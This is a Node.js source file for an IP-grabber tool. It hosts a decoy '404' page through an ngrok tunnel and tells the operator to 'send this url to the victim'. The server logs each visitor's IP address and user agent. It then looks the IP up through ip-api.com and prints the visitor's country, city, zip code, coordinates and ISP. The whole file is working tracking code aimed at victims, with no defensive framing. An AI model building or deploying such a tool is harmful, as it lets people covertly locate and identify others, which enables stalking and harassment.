var prompt = require('prompt-sync')();
const chalk = require('chalk')
const ngrok = require('ngrok');
var axios = require('axios')
const express = require('express')
var Token = require('./Authtoken.json')
const app = express()
/*
                      This Code was Coded by StiizzyCat#001
                    Please give me credit when u use the code. 
                    idea from TheLinuxChoice, Credits to them
                            (C) Stiizzy Cat 2022
*/
function banner() {
    console.log(chalk.blue(`
    888888 88 88     888888 888888 88""Yb Yb        dP    db    88""Yb 888888 
    88__   88 88       88   88__   88__dP  Yb  db  dP    dPYb   88__dP 88__   
    88""   88 88  .o   88   88""   88"Yb    YbdPYbdP    dP__Yb  88"Yb  88""   
    88     88 88ood8   88   888888 88  Yb    YP  YP    dP""""Yb 88  Yb 888888  `))
    console.log(chalk.bgBlue('ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤv1.0 Coded By: https://github.com/StiizzyCatㅤㅤㅤㅤㅤㅤㅤㅤ'))
}


async function Menu() {
    banner()
        console.log("")
        var Port = prompt(chalk.yellow(`[+]`) + chalk.blueBright(` Enter a port number: `))
        app.get('/', (req, res) => {
            res.send(`<h1>404 Resource not found!</h1>`)
            console.log("")
            console.log(chalk.greenBright(`[+] IP Logged: `) + chalk.yellowBright(`${req.headers['x-forwarded-for']}`))
            console.log(chalk.greenBright(`[+] UserAgent: `) + chalk.yellowBright(`${req.headers['user-agent']}`))
            axios.get(`http://ip-api.com/json/${req.headers['x-forwarded-for']}`).then(async res => {
                var data = res.data
                console.log(chalk.greenBright(`[+] Asn: `) + chalk.yellowBright(`${data.as}`))
                console.log(chalk.greenBright(`[+] Contury: `) + chalk.yellowBright(`${data.country}`))
                console.log(chalk.greenBright(`[+] Region: `) + chalk.yellowBright(`${data.regionName}`))
                console.log(chalk.greenBright(`[+] City: `) + chalk.yellowBright(`${data.city}`))
                console.log(chalk.greenBright(`[+] Zip: `) + chalk.yellowBright(`${data.zip}`))
                console.log(chalk.greenBright(`[+] Lat: `) + chalk.yellowBright(`${data.lat}`))
                console.log(chalk.greenBright(`[+] Long: `) + chalk.yellowBright(`${data.lon}`))
                console.log(chalk.greenBright(`[+] Isp: `) + chalk.yellowBright(`${data.isp}`))
                console.log(chalk.greenBright(`[+] Timezone: `) + chalk.yellowBright(`${data.timezone}`))
            })
        })
        app.listen(Port, () => console.log(chalk.yellow(`[+]`) + chalk.blueBright(` Express server has launched!`)))
        if (isNaN(Port)) {
            console.log(chalk.redBright('Port Number Cannot Be A String'))
            setTimeout(() => {
                return console.clear(), Menu()
            }, 1000);
        } else {
            const Url = await ngrok.connect({
                proto: 'http',
                addr: Port,
                authtoken: Token.AUTH
            });
            setTimeout(() => {
                console.log(chalk.yellow(`[+]`) + chalk.blueBright(` Send this url to the victim: ${Url}`))
                console.log("")
                console.log(chalk.yellow(`[*]`) + chalk.blueBright(` Waiting Targets, Press Ctrl + C to exit...`))
            }, 1000);
        }
    }
Menu()
